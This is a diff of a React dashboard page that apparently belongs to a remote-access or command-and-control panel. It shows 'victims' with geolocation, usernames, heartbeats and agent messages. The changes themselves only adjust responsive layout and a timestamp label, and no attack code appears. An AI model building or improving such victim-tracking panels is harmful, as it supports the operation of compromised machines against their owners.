@@ -25,13 +25,13 @@ export default function DashboardPage() {
       <div className="space-y-3 pt-3">
         <Counters data={dashboard.data} loading={dashboard.loading} />
 
-        <div className="grid grid-cols-[1fr_360px] gap-3">
+        <div className="grid grid-cols-1 gap-3 xl:grid-cols-[1fr_360px]">
           <Card className="overflow-hidden">
             <CardHeader>
               <CardTitle>Geolocalización</CardTitle>
               <span className="font-mono text-2xs text-muted">heartbeat · refresco 20 s</span>
             </CardHeader>
-            <WorldMap onSelect={(point) => router.push(`/victims?select=${point.id}`)} />
+            <WorldMap className="min-h-[300px]" onSelect={(point) => router.push(`/victims?select=${point.id}`)} />
           </Card>
 
           <div className="space-y-3">
@@ -64,7 +64,7 @@ export default function DashboardPage() {
           </div>
         </div>
 
-        <div className="grid grid-cols-[1fr_360px] gap-3">
+        <div className="grid grid-cols-1 gap-3 xl:grid-cols-[1fr_360px]">
           <Card>
             <CardHeader>
               <CardTitle>Equipos recientes</CardTitle>
@@ -81,7 +81,7 @@ export default function DashboardPage() {
                       <TD className="text-muted">{flag(victim.countryCode)} {victim.country ?? '—'}</TD>
                       <TD className="font-mono text-muted">{victim.username}</TD>
                       <TD className="space-x-1">{victim.tags.slice(0, 3).map((tag) => <Badge key={tag}>{tag}</Badge>)}</TD>
-                      <TD className={victim.online ? 'num text-ok' : 'num text-muted'}>{ago(victim.online ? victim.lastAgentMessageAt ?? victim.lastHeartbeatAt : victim.lastHeartbeatAt)} ago</TD>
+                      <TD className={victim.online ? 'num text-ok' : 'num text-muted'}>{ago(victim.online ? victim.lastAgentMessageAt ?? victim.lastHeartbeatAt : victim.lastHeartbeatAt)}</TD>
                     </TR>
                   ))}
                 </tbody>
